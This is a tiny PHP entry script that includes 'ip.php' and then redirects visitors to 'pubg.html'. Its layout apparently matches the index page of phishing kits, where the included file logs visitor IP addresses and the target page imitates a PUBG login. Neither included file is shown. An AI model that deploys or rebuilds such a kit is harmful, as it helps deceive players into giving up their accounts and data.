<?php
include 'ip.php';
header('Location: pubg.html');
exit
?>